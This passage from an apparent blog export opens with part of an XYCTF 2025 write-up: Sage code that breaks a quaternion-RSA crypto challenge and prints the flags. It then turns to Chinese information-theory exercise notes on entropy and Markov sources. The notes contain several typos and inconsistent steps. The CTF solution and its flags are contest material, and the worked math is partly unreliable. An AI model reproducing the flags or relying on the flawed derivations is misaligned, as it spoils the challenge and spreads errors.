3 位flag = enc ^ randnumflag = long_to_bytes(flag)print(flag)# XYCTF{___0h_51mple_r@nd0m___} 复复复复数问问 DeepSeek，直接就逆出了 hints，但是 flag 还是还原不出来，一看原来 $e$ 跟 $\\varphi(n)$ 不互素，呃呃了，感觉国内出题都喜欢这样再看看能不能偷鸡，一看 $e$ 和每个素因子的 phi GCD 都是 3，好吧，老老实实开个根先还原出 $m^9$，再开两次三次方根即可，多拷打两下 DeepSeek 就把代码给出来了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107from sage.all import *# 给定数据h0 = 375413371936h1 = 452903063925h2 = 418564633198h3 = 452841062207P = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109g0 = 8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729g1 = 20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171g2 = 22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868g3 = 40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863n = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367e = 65547R = Zmod(P)# 构建方程组矩阵（前三方程）A = matrix(R, [ [h1, h2, h3], [h0, -h3, h2], [h3, h0, -h1]])b = vector(R, [(-g0) % P, g1 % P, g2 % P])try: p, q, r = A.solve_right(b) # 验证第四个方程 if (h0*r + h1*q - h2*p) % P == g3 % P: # 验证n = p*q*r if (p * q * r) == n: print(f&quot;Success! p={p}, q={q}, r={r}&quot;) else: print(&quot;Solution does not match n.&quot;) else: print(&quot;Solution does not satisfy all equations.&quot;)except ValueError as e: print(&quot;No solution:&quot;, e)# 四元数类定义（需在Sage中实现或使用Python处理）# 此处需将c的分量代入，计算c^d mod n，然后转换为字节# 以下为伪代码示例class ComComplex: def __init__(self, value=[0,0,0,0]): self.value = value def __str__(self): s = str(self.value[0]) for k,i in enumerate(self.value[1:]): if i &gt;= 0: s += '+' s += str(i) +'ijk'[k] return s def __add__(self,x): return ComComplex([i+j for i,j in zip(self.value,x.value)]) def __mul__(self,x): a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3] b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2] c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1] d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0] return ComComplex([a,b,c,d]) def __mod__(self,x): return ComComplex([i % x for i in self.value]) def __pow__(self, x, n=None): tmp = ComComplex(self.value) a = ComComplex([1,0,0,0]) while x: if x &amp; 1: a *= tmp tmp *= tmp if n: a %= n tmp %= n x &gt;&gt;= 1 return a # 解密步骤（假设已获得p, q, r）phi = (p**4-1)*(q**4-1)*(r**4-1)e = 65547 // 9print(gcd(e, phi))d = pow(int(e), -1, int(phi))# c = 212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103+24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825i+45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125j+96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385kfrom Crypto.Util.number import long_to_bytesc = ComComplex([212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103,24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825,45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125, 96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385]) # 输入题目中的c值m = pow(c, d, n)# print(m)p = int(p)phi_p = p**4-1e = 65547 // 9dp = int(pow(int(e), -1, int(phi_p)))mp = pow(c, dp, p)from getroot3 import get_root3m3 = get_root3(p, [mp.value[0], mp.value[1], mp.value[2], mp.value[3]])print(len(m3))for mm3 in m3: m = get_root3(p, mm3) if len(m) == 0: continue for mm in m: print(mm) flag = b''.join(long_to_bytes(int(component)) for component in mm) print(&quot;Flag:&quot;, flag) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586# getroot3.pyfrom sage.all import *def get_root3(p, Q): F = GF(p) # 定义有限域GF(p) Q = (F(Q[0]), F(Q[1]), F(Q[2]), F(Q[3])) # 将四元数转换为GF(p)中的元素 def quaternion_mult(q1, q2): a1, b1, c1, d1 = q1 a2, b2, c2, d2 = q2 scalar = a1*a2 - b1*b2 - c1*c2 - d1*d2 i = a1*b2 + b1*a2 + c1*d2 - d1*c2 j = a1*c2 - b1*d2 + c1*a2 + d1*b2 k = a1*d2 + b1*c2 - c1*b2 + d1*a2 return (scalar, i, j, k) def quaternion_pow(q, n): result = (F(1), F(0), F(0), F(0)) while n &gt; 0: if n % 2 == 1: result = quaternion_mult(result, q) q = quaternion_mult(q, q) n = n // 2 return result # 提取目标四元数的标量部分和向量部分 W, X, Y, Z = Q S = W V = (X, Y, Z) N_V = (X**2 + Y**2 + Z**2) # 向量部分的范数 N_Q = (W**2 + N_V) # 目标四元数的总范数 solutions = [] # Step 1: 检查 N_Q 是否为三次剩余 try: cube_roots_NQ = N_Q.nth_root(3, all=True) except ValueError: cube_roots_NQ = [] for n in cube_roots_NQ: # Step 2: 解三次方程 4*N_V*k**3 -3*n*k +1 = 0 if N_V == 0: # 处理纯标量情况 if X == 0 and Y == 0 and Z == 0: try: s_roots = S.nth_root(3, all=True) solutions.extend( (s, F(0), F(0), F(0)) for s in s_roots ) except: pass continue # R.&lt;k&gt; = PolynomialRing(F) R = PolynomialRing(F, 'k') k = R.gen() eq = 4*N_V * k**3 - 3*n * k + 1 k_candidates = eq.roots(multiplicities=False) for k in k_candidates: # Step 3: 计算 s² = n - k²*N_V s_sq = n - k**2 * N_V if s_sq == 0: s_candidates = [F(0)] else: if not s_sq.is_square(): continue s_candidates = s_sq.sqrt(all=True) for s in s_candidates: # Step 4: 验证标量方程 s*(n -4k²*N_V) ≡ S mod p lhs = s * (n - 4*k**2*N_V) if lhs == S: q = (s, k*X, k*Y, k*Z) # 验证 q**3 是否等于 Q（避免计算误差） if quaternion_pow(q, 3) == Q: solutions.append(q) # 去重并输出 solutions = list(set(solutions)) # print(f&quot;解为：{solutions}&quot;) return solutionsif __name__ == &quot;__main__&quot;: p = 63173373914948586508761871207488662566773264479285518327131522282352053209317 Q = (36698564177888078258192095739455152652959860052111216061091759447957860686074, 17870807869940687395361314550407377371850625515573380948432760072344080142389, 28335490245070169116781105091378482201161610915164600915589821149813685522901, 11951863920094324549214074577482301476865489472163720590246328864154628320061) get_root3(p, Q) 最终得到 flag：flag{Quaternion_15_ComComComComplexXXX!!!?} 参考https://www.ek1ng.com/SEKAICTF2022.htmlhttps://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/https://blog.csdn.net/xuxingzhuang/article/details/117108502https://www.freebuf.com/articles/web/426189.html","link":"/2025/04/04/2025%20XYCTF/"},{"title":"信息论笔记","text":"还是复习。 第一章 绪论不提 第二章 离散信息的度量习题 2.6在某地篮球联赛的每个赛季中，最终只有 A、B 两队进入决赛争夺冠军。决赛采用 7 场 4 胜制，首先赢得 4 场胜利的球队获得冠军，并结束比赛。把产生冠军的事件 x 用 A、B 两队各场次比赛结果表示，作为信源 X 产生的随机事件，例如：AAAA 表示事件“A 队前 4 场获得冠军”；ABBAAA 表示事件“ A 队在第 1、4、5、6 场取胜获得冠军（而 B 队在第 2、3 场取胜）”……假设两队在每场比赛中的取胜机会均等，每场比赛只有“A 胜”或“B 胜”两种结果，并且各场比赛的结果是彼此独立的。 （1）求信源的熵 H(X)。 事件 数目 单事件的概率 概率的和 赛 4 场获冠军（AAAA） 1 1/16 1/16 赛 5 场获冠军（前 4 场 B 胜 1 场） 4 1/32 1/8 赛 6 场获冠军（前 5 场 B 胜 2 场） 10 1/64 5/32 赛 7 场获冠军（前 6 场 B 胜 3 场） 20 1/128 5/32 总概率 1/2 $H(X) = 2 \\times \\left[ (1/16) \\log_2 16 + 4 \\times (1/32) \\log_2 32 + 10 \\times (1/64) \\log_2 64 + 20 \\times (1/128) \\log_2 128 \\right] = 186/32 = 5.8125 $ 比特/符号 注意到上面乘 2 是因为 A 队和 B 队的概率是相等的。 （2）求事件“两队打满 7 场”所提供的信息量。“两队打满7场”事件数为 40，所求概率为 $40 \\times (1/128) = 5/16$ ，事件“两队打满7场”所提供的信息量为$$I_1 = -\\log_2 (5/16) = 1.6781 \\text{ bit}$$（3）列出 A 队前 3 场都失利的所有情形，求“A 队前 3 场都失利”所提供的信息量。如表所示： 事件 概率 结果 BBBB 1/16 B 夺冠 BBBAB 1/32 B 夺冠 BBBAAB 1/64 B 夺冠 BBBAAAB 1/128 B 夺冠 BBBAAAA 1/128 A 夺冠 概率和就是 1/8，所以有 $$I_2 = \\log_2 8 = 3 \\text{ bit}$$（4）求事件“A 队在前 3 场获胜的条件下又取得冠军”所提供的信息量。A队在前 3 场失利的条件下又取得冠军的条件概率为$$\\frac{1/128}{1/16 + 1/32 + 1/64 + 2 \\times (1/128)} = \\frac{1}{16}$$“A队在前 3 场失利的条件下又取得冠军”的信息量为$$I_3 = \\log_2 16 = 4 \\text{ bit}$$ 习题 2.7已知随机变量 $X, Y$ 的联合概率分布为 $P_{XY}(a_k, b_j)$ ，满足：$P_X(a_1) = 1/2$, $P_X(a_2) = P_X(a_3) = 1/4$,$P_Y(b_1) = 2/3$, $P_Y(b_2) = P_Y(b_3) = 1/6$。试求能使 $H(XY)$ 取最大值的 $XY$ 的联合概率分布。 因为 $H(XY) \\leq H(X) + H(Y)$，当且仅当 $X, Y$ 独立时，等号成立。所以当 $X, Y$ 独立时，$H(XY)$ 取最大值。因此 $XY$ 的联合概率分布为 $$\\begin{aligned}p(a_1 b_1) &amp;= \\frac{1}{3}, &amp; p(a_1 b_2) &amp;= \\frac{1}{12}, &amp; p(a_1 b_3) &amp;= \\frac{1}{12}, \\\\p(a_2 b_1) &amp;= \\frac{1}{6}, &amp; p(a_2 b_2) &amp;= \\frac{1}{24}, &amp; p(a_2 b_3) &amp;= \\frac{1}{24}, \\\\p(a_3 b_1) &amp;= \\frac{1}{6}, &amp; p(a_3 b_2) &amp;= \\frac{1}{24}, &amp; p(a_3 b_3) &amp;= \\frac{1}{24}.\\end{aligned}$$ 习题 2.16两随机变量 $X, Y$ ，联合概率 $p(x,y)$ 如下： y=0 y=1 x=0 1/8 3/8 x=1 3/8 1/8 $Z = X \\cdot Y$（一般乘积），试计算： (1) $H(X), H(Y), H(Z), H(XZ), H(YZ), H(XYZ)$;(2) $H(X|Y), H(Y|X), H(X|Z), H(Z|X), H(Y|Z), H(Z|Y), H(Z|YZ), H(Y|XZ), H(Z|XY)$;(3) $I(X;Y), I(X;Z), I(Y;Z), I(X;Y|Z), I(Y;Z|X), I(X;Z|Y)$。$$p(xz) = \\sum_y p(xyz); \\quad p(yz) = \\sum_x p(xyz); \\quad p(xyz) = p(xy) \\cdot p(z | xy)$$其概率取值容易计算如下： $P_X(0) = 1/2$，即 $P(X=0) = 1/2$，下同$P_X(1) = 1/2$ $P_Y(0) = 1/2$$P_Y(1) = 1/2$ 由表知，$x=0$ 和 $y=0$ 都能让 Z 为 0，故$P_Z(0) = 1/8+3/8+3/8 = 7/8$$P_Z(1) = 1/8$ (1)主要利用自信息的平均值为熵，即$$H(X) = E_{p(x)}[-\\log p(x)]$$注意 $\\log$ 默认是以 2 为底的比如 $H(XZ)$，先列出所有可能，知 $P(X=0, Z=0) = 1/2$，$P(X=1, Z=0) = 3/8$，$P(X=1, Z=1) = 1/8$，所以 $H(XZ) = -(1/2) \\log (1/2) - (3/8) \\log (3/8) - (1/8) \\log (1/8) = 1.406$ 比特/符号$$\\begin{aligned}H(X) = H(1/2) = 1 \\text{ 比特/符号}\\\\H(Y) = H(1/2) = 1 \\text{ 比特/符号}\\\\H(Z) = H(1/8) = 0.544 \\text{ 比特/符号}\\\\H(XZ) = H(1/2, 3/8, 1/8) = 1.406 \\text{ 比特/符号}\\\\H(YZ) = H(XZ) = 1.406 \\text{ 比特/符号}\\\\H(XYZ) = H(1/8, 3/8, 3/8, 1/8) = 1.811 \\text{ 比特/符号}\\end{aligned}$$ (2)主要利用熵的可加性，即 $H(XY) = H(X) + H(Y|X)$$$\\begin{aligned}H(X | Y) = H(XY) - H(Y) = 1.811 - 1 = 0.811 \\text{ 比特/符号}\\\\H(Y | X) = H(XY) - H(X) = 1.811 - 1 = 0.811 \\text{ 比特/符号}\\\\H(X | Z) = H(XZ) - H(Z) = 1.406 - 0.544 = 0.862 \\text{ 比特/符号}\\\\H(Z | X) = H(XZ) - H(X) = 1.406 - 1 = 0.406 \\text{ 比特/符号}\\\\H(Y | Z) = H(YZ) - H(Z) = 1.406 - 0.544 = 0.862 \\text{ 比特/符号}\\\\H(Z | Y) = H(YZ) - H(Y) = 1.406 - 1 = 0.406 \\text{ 比特/符号}\\\\H(X | YZ) = H(XYZ) - H(YZ) = 1.811 - 1.406 = 0.405 \\text{ 比特/符号}\\\\H(Y | XZ) = H(XYZ) - H(XZ) = 1.811 - 1.406 = 0.405 \\text{ 比特/符号}\\\\H(Z | XY) = H(XYZ) - H(XY) = 1.811 - H(1/8, 3/8, 3/8, 1/8) = 0\\end{aligned}$$ (3)主要利用平均互信息与熵的关系，即$$I(X;Y) = H(X) - H(X | Y) = H(Y) - H(Y | X) = H(X) + H(Y) - H(XY)$$$$\\begin{aligned}I(X;Y) = H(X) - H(X | Y) = 1 - 0.811 = 0.189 \\text{ 比特/符号}\\\\I(X;Z) = H(X) - H(X | Z) = 1 - 0.862 = 0.138 \\text{ 比特/符号}\\\\I(Y;Z) = H(Y) - H(Y | Z) = 1 - 0.862 = 0.138 \\text{ 比特/符号}\\\\I(X; Y | Z) = H(X | Z) - H(X | YZ) = 0.862 - 0.405 = 0.457 \\text{ 比特/符号}\\\\I(Y; Z | X) = H(Y | X) - H(Y | XZ) = 0.811 - 0.405 = 0.406 \\text{ 比特/符号}\\\\I(X; Z | Y) = H(X | Y) - H(X | YZ) = 0.811 - 0.405 = 0.406 \\text{ 比特/符号}\\end{aligned}$$ 第三章 离散信源重点公式：$\\pi^T = \\pi^T P$ 习题 3.9设 $x_1, x_2, \\cdots, x_{n-1}, x_n, \\cdots$ 为平稳序列（未必是马氏链），那么下面的论断哪些是正确的？对正确的进行证明，对错误的举出反例。（提示：下面论断至少有一个是错的）(1) $H(X_n | X_0) = H(X_{-n} | X_0)$;正确，由于平稳性有$$H(X_{-n} | X_0) = H(X_0 X_n) = H(X_0 X_n) - H(X_n) = H(X_n X_0) - H(X_0) = H(X_n | X_0)$$(2) $H(X_n | X_0) \\geqslant H(X_{n-1} | X_0)$;错误，若 $x_0, \\cdots, x_{n-1}, x_n$ 构成马氏链，则$$\\begin{aligned}I(X_0 ; X_{n-1}) \\geqslant I(X_0 ; X_n) \\implies H(X_{n-1}) - H(X_{n-1} | X_0) \\geqslant H(X_n) - H(X_n | X_0) \\\\\\implies -H(X_{n-1} | X_0) \\geqslant -H(X_n | X_0) \\ (\\text{利用平稳性}) \\implies H(X_n | X_0) \\geqslant H(X_{n-1} | X_0)\\end{aligned}$$但如果序列具有周期性，且周期为 $n$，其中，$x_0, x_1, \\cdots, x_n$ 是独立同分布的二元等概率序列，则$$\\begin{aligned}x_k = x_{k-n} \\ (k \\geqslant n) \\implies x_0 = x_n \\implies H(X_n | X_0) = 0, \\ H(X_{n-1} | X_0) = H(X_{n-1}) = \\log 2 \\\\\\implies H(X_n | X_0) &lt; H(X_{n-1} | X_0)\\end{aligned}$$(3) $H(X_n | X_1X_2\\cdots X_{n-1})$ 是 $n$ 的增函数;错误定理 3.3 对任意离散平稳信源，若 $H_1(X) &lt; \\infty$ ，有： ① $H(X_N | X_1\\cdots X_{N-1})$ 不随 $N$ 而增加；② $H_N(X) \\geqslant H(X_N | X_1 \\cdots X_{N-1})$；③ $H_N(X)$ 不随 $N$ 而增加；④ $H_\\infty(X)$ 存在，且 $H_\\infty(X) = \\lim_{N \\to \\infty} H(X_N | X_1 \\cdots X_{N-1})$ (4) $H(X_n | X_1, \\cdots, X_{n-1}, X_{n+1}, \\cdots, X_{2n})$ 是 $n$ 的非增函数。正确$$\\begin{aligned}H(X_{n+1} | X_1, \\cdots, X_n, X_{n+2}, \\cdots, X_{2n+2}) = H(X_n | X_0, \\cdots, X_{n-1}, X_{n+1}, \\cdots, X_{2n+1}) \\\\\\leqslant H(X_n | X_1, \\cdots, X_{n-1}, X_{n+1}, \\cdots, X_{2n})\\end{aligned}$$ 习题 3.10一个 2 状态马氏链的转移概率矩阵为$$P = \\begin{pmatrix} 3/4 &amp; 1/4 \\\\ 1/4 &amp; 3/4 \\end{pmatrix}$$并假定初始状态概率矢量为 $p^{(0)} = (1 \\ 0)$；求(1) $P^n$ 和 $p^{(n)}$, $n = 1, 2, 3$；$$P^1 = P = \\begin{pmatrix} 3/4 &amp; 1/4 \\\\ 1/4 &amp; 3/4 \\end{pmatrix}, \\quadP^2 = P \\times P = \\begin{pmatrix} 3/4 &amp; 1/4 \\\\ 1/4 &amp; 3/4 \\end{pmatrix} \\begin{pmatrix} 3/4 &amp; 1/4 \\\\ 1/4 &amp; 3/4 \\end{pmatrix} = \\begin{pmatrix} 5/8 &amp; 3/8 \\\\ 3/8 &amp; 5/8 \\end{pmatrix}$$$$P^3 = P^2 \\times P = \\begin{pmatrix} 5/8 &amp; 3/8 \\\\ 3/8 &amp; 5/8 \\end{pmatrix} \\begin{pmatrix} 3/4 &amp; 1/4 \\\\ 1/4 &amp; 3/4 \\end{pmatrix} = \\begin{pmatrix} 9/16 &amp; 7/16 \\\\ 7/16 &amp; 9/16 \\end{pmatrix}$$所以，有$$p^{(1)} = p^{(0)} P = \\begin{pmatrix} 3/4 &amp; 1/4 \\end{pmatrix} ; \\quad p^{(2)} = p^{(0)} P^2 = \\begin{pmatrix} 5/8 &amp; 3/8 \\end{pmatrix} ; \\quad p^{(3)} = p^{(0)} P^3 = \\begin{pmatrix} 9/16 &amp; 7/16 \\end{pmatrix}$$ (2) $P^n$ 和 $p^{(n)}$ 的一般形式。由上面已经求得的结果可以类推得$$P^n = \\begin{pmatrix} \\frac{2^n + 1}{2^{n+1}} &amp; \\frac{2^n - 1}{2^{n+1}} \\\\ \\frac{2^n - 1}{2^{n+1}} &amp; \\frac{2^n + 1}{2^{n+1}} \\end{pmatrix}, \\quad p^{(n)} = p^{(0)} P^n = \\begin{pmatrix} 1 &amp; 0 \\end{pmatrix} \\begin{pmatrix} \\frac{2^n + 1}{2^{n+1}} &amp; \\frac{2^n - 1}{2^{n+1}} \\\\ \\frac{2^n - 1}{2^{n+1}} &amp; \\frac{2^n + 1}{2^{n+1}} \\end{pmatrix} = \\begin{pmatrix} \\frac{2^n + 1}{2^{n+1}} &amp; \\frac{2^n - 1}{2^{n+1}} \\end{pmatrix}$$ 习题 3.153.15 黑白气象传真图的消息只有黑色和白色两种，即信源 $X={\\text{黑}, \\text{白}}$ ；设黑色出现的概率为 $p(\\text{黑}) = 0.3$ ，白色的出现概率 $p(\\text{白}) = 0.7$ ： (1) 假设图上黑白消息出现前后没有关联，求熵 $H(X)$ ；假设黑白消息出现的前后没有关联，则等效于一个离散无记忆信源，概率空间为$$\\begin{pmatrix}X \\\\ P(x)\\end{pmatrix}=\\begin{pmatrix}\\text{黑} &amp; \\text{白} \\\\0.3 &amp; 0.7\\end{pmatrix}, \\quad \\sum_{i=1}^{2} P(x_i) = 1$$信源的熵为$$H(X) = -\\sum_{i=1}^{2} P(x_i) \\log P(x_i) = -0.7 \\log_2 0.7 - 0.3 \\log_2 0.3 = 0.881 \\text{比特/符号}$$(2) 假设消息前后有关联，其依赖关系为 $P(\\text{白}|\\text{白}) = 0.9$, $P(\\text{黑}|\\text{白}) = 0.1$, $P(\\text{白}|\\text{黑}) = 0.2$, $P(\\text{黑}|\\text{黑}) = 0.8$，求此一阶马氏链的熵率 $H_2$；假设黑白气象传真图的消息前后有关联，其状态集 $E = A = {\\text{黑}, \\text{白}}$ ，可以得到其状态转移矩阵为$$P = \\begin{pmatrix}0.9 &amp; 0.1 \\\\0.2 &amp; 0.8\\end{pmatrix}$$ 此马尔可夫链状态转移矩阵有，则状态平稳分布存在。设状态的平稳分布为 $\\pi^T = (\\pi_1, \\pi_2)$ ，有$$\\pi^T = \\pi^T P, \\quad \\pi_1 + \\pi_2 = 1, \\quad 得到 \\pi_1 = 2/3, \\pi_2 = 1/3.$$ 此一阶马氏源的熵为$$H_2 = \\frac{2}{3} H(0.1, 0.9) + \\frac{1}{3} H(0.2, 0.8) \\approx 0.553 \\text{比特/符号}$$(3) 分别求上述两种信源的剩余度，并比较 $H(X)$ 和 $H_2$ 的大小，并说明其物理意义。前后没有关联情况下信源的剩余度：$$\\gamma_1 = 1 - \\frac{0.881}{H(1/2)} = 1 - \\frac{0.881}{1} = 0.119$$ 一阶马尔可夫信源的剩余度：$$\\gamma_2 = 1 - \\frac{0.553}{H(1/2)} = 1 - \\frac{0.553}{1} = 0.447$$ $$H(X) &gt; H_2, \\quad \\gamma_1 &lt; \\gamma_2$$ 物理意义：一阶马尔可夫信源考虑了消息前后的关联，使得符号熵减少，信源的冗余增加，同时编码的熵增加。 习题 3.21给了一个一阶马氏链的状态转移图如图，符号集为 ${0, 1, 2}$ 。 (1) 求状态平稳分布 $(\\pi_0, \\pi_1, \\pi_2)$ 和马氏链熵率。由状态图可得状态转移矩阵$$P = \\begin{pmatrix}1 - p &amp; p/2 &amp; p/2 \\\\p/2 &amp; 1 - p &amp; p/2 \\\\p/2 &amp; p/2 &amp; 1 - p\\end{pmatrix}$$由 $\\pi^T P = \\pi^T$，即 $\\pi = (\\pi_0, \\pi_1, \\pi_2)$ 满足$$(\\pi_0, \\pi_1, \\pi_2) \\begin{pmatrix}1 - p &amp; p/2 &amp; p/2 \\\\p/2 &amp; 1 - p &amp; p/2 \\\\p/2 &amp; p/2 &amp; 1 - p\\end{pmatrix} = (\\pi_0, \\pi_1, \\pi_2)$$以及 $\\pi_0 + \\pi_1 + \\pi_2 = 1$。解得$$(\\pi_0, \\pi_1, \\pi_2) = (1/3, 1/3, 1/3)$$信源的符号熵为$$\\begin{aligned}H_\\infty = H_2 = \\pi_0 H \\left( 1-p, \\frac{p}{2}, \\frac{p}{2} \\right) + \\pi_1 H \\left( \\frac{p}{2}, 1-p, \\frac{p}{2} \\right) + \\pi_2 H \\left( \\frac{p}{2}, \\frac{p}{2}, 1-p \\right)\\\\= - (1-p) \\log_2 (1-p) - p \\log_2 p + p \\text{ 比特/符号}\\end{aligned}$$ (2) 当 $p$ 为何值时，信源熵率达到最大值？当 $p = 0$ 或 $1$ 时，结果如何？因为 $H_\\infty = -(1-p) \\log (1-p) - p \\log p + p$，对 $p$ 求一阶导数：$$H_\\infty’ (p) = \\log (1-p) + \\frac{1}{\\ln 2} - \\log p - \\frac{1}{\\ln 2} + 1 = \\log \\frac{2(1-p)}{p}$$ 令 $H_\\infty’ (p) = 0$，得 $\\log \\frac{2(1-p)}{p} = 0$，所以 $\\frac{2(1-p)}{p} = 1$。 所以 $p = 2/3$ 时，$H_\\infty$ 达到最大值：$H_\\infty$ 的最大值等于 $\\log_2 3 \\approx 1.585$ 比特/符号；当 $p = 0$ 时，$H_\\infty = 0$；当 $p = 1$ 时，$H_\\infty = -(1-p) \\log_2 (1-p) - p \\log_2 p + p = 1$ 比特/符号。 (3) 如果将信源看成无记忆的且以平稳分布为概率分布，求信源的熵率。$$\\begin{pmatrix}X \\\\ P(a_i)\\end{pmatrix}=\\begin{pmatrix}0 &amp; 1 &amp; 2 \\\\1/3 &amp; 1/3 &amp; 1/3\\end{pmatrix}$$ 得$$H(X) = -\\sum_{i=1}^{3} P(a_i) \\log P(a_i) = \\log_2 3 \\approx 1.585 \\text{比特/符号}$$ 由此计算结果可知 $H(X) = H_\\infty$。 第四章 连续信息与连续信源习题 4.1(1) 指数概率密度 $p(x) = \\lambda e^{-\\lambda x}, x \\geqslant 0$;$$\\begin{aligned}h(X) = -\\int_{0}^{\\infty} p(x) \\log p(x) \\mathrm{d}x = -\\int_{0}^{\\infty} \\lambda e^{-\\lambda x} \\log (\\lambda e^{-\\lambda x}) \\mathrm{d}x \\\\= -\\int_{0}^{\\infty} \\lambda e^{-\\lambda x} \\log \\lambda \\mathrm{d}x - \\int_{0}^{\\infty} \\lambda e^{-\\lambda x} \\log e^{-\\lambda x} \\mathrm{d}x = \\log \\frac{e}{\\lambda}\\end{aligned}$$(2) 拉普拉斯概率密度 $p(x) = (1/2) \\lambda e^{-\\lambda |x|}$。$$\\begin{aligned}h(X) = -\\int_{-\\infty}^{\\infty} p(x) \\log p(x) \\mathrm{d}x = -\\int_{-\\infty}^{\\infty} \\frac{1}{2} \\lambda e^{-\\lambda |x|} \\log \\left( \\frac{1}{2} \\lambda e^{-\\lambda |x|} \\right) \\mathrm{d}x \\\\= -\\log \\frac{1}{2} \\lambda \\int_{-\\infty}^{\\infty} \\frac{1}{2} \\lambda e^{-\\lambda |x|} \\mathrm{d}x + \\int_{-\\infty}^{\\infty} \\frac{1}{2} \\lambda e^{-\\lambda |x|} \\log (e^{-\\lambda |x|}) \\mathrm{d}x \\\\= \\log \\frac{2e}{\\lambda}\\end{aligned}$$ 习题 4.13给定两连续随机变量 $X$ 和 $Y$ ，其中 $X$ 的概率密度是 $p(x) = e^{-x} (0 \\leqslant x &lt; \\infty)$ ，条件概率密度是 $p(y/x) = xe^{-xy} (0 \\leqslant y &lt; \\infty)$ 。求 $h(X), h(Y), h(XY), I(X;Y)$ 。$$\\begin{aligned}h(X) = -\\int_{0}^{\\infty} p(x) \\log p(x) dx = -\\int_{0}^{\\infty} e^{-x} \\log e^{-x} dx = - (\\log e) \\int_{0}^{\\infty} x de^{-x} = \\log e \\\\p(y) = \\int_{0}^{\\infty} p(x) p(y | x) dx = \\int_{0}^{\\infty} x e^{-x(1+y)} dx = - \\int_{0}^{\\infty} \\frac{x}{1+y}d e^{-x(1+y)} dx = \\frac{1}{(1+y)^2} \\\\h(Y) = -\\int_{0}^{\\infty} \\frac{1}{(1+y)^2} \\log \\frac{1}{(1+y)^2} dy = -2 \\int_{0}^{\\infty} \\frac{1}{1+y} \\log (1+y) d\\frac{1}{1+y} = 2 \\log e \\\\h(XY) = -\\int_{0}^{\\infty} \\int_{0}^{\\infty} x e^{-x(1+y)} \\log [x e^{-x(1+y)}] dx dy \\\\= - \\int_{0}^{\\infty} x \\log x \\left( \\int_{0}^{\\infty} e^{-x(1+y)} dy \\right) dx + (\\log e) \\int_{0}^{\\infty} x^2\\left( \\int_{0}^{\\infty}(1+y) e^{-x(1+y)} dy \\right) dx \\\\= - \\int_{0}^{\\infty} x \\log x \\left( \\frac{e^{-x}}{x} \\right) dx + (\\log e)\\int_{0}^{\\infty} x \\left( e^{-x} + \\int_{0}^{\\infty}e^{-x(1+y)} dy \\right) dx \\\\= -\\int_{0}^{\\infty} e^{-x} \\log x dx + (\\log e) \\int x\\left( \\frac{e^{-x} + e^{-x}}{x} \\right) dx = \\gamma \\log e + 2 \\log e = (\\gamma + 2) \\log e \\\\I(X;Y) = h(X) + h(Y) - h(XY) = (1 - \\gamma) \\log e\\end{aligned}$$ 其中，$\\gamma = -\\int_{0}^{\\infty} e^{-x} \\ln x dx$ 为欧拉常数，定义为调和级数与自然对数的差值，约等于 0.577 2。 习题 4.14给定两连续随机变量 $X$ 和 $Y$ ，它们的联合概率密度是$$p(xy) = \\frac{1}{2 \\pi \\sigma_x \\sigma_y} \\exp{\\lbrace{- \\frac{(x - m_x)^2}{2 \\sigma_x^2} - \\frac{(y - m_y)^2}{2 \\sigma_y^2}\\rbrace}, \\quad -\\infty &lt; x, y &lt; \\infty}$$ (1) 求随机变量 $U = X + Y$ 和 $V = X - Y$ 的概率密度函数 $p(u)$ 和 $p(v)$ 。$$\\begin{aligned}p(x) = \\int_{-\\infty}^{\\infty} p(xy) dy = \\frac{1}{\\sqrt{2\\pi} \\sigma_x} \\exp \\left[ - \\frac{(x - m_x)^2}{2\\sigma_x^2} \\right] \\\\p(y) = \\int_{-\\infty}^{\\infty} p(xy) dx = \\frac{1}{\\sqrt{2\\pi} \\sigma_y} \\exp \\left[ - \\frac{(y - m_y)^2}{2\\sigma_y^2} \\right] \\\\p(x) p(y) = p(xy) \\implies X 和 Y 是相互独立的高斯随机变量 \\implies U 的均值和方差分别为 m_x + m_y 和 \\sigma_x^2 + \\sigma_y^2 \\\\\\implies p(u) = \\frac{1}{\\sqrt{2\\pi(\\sigma_x^2 + \\sigma_y^2)}} \\exp \\left[ - \\frac{(z - 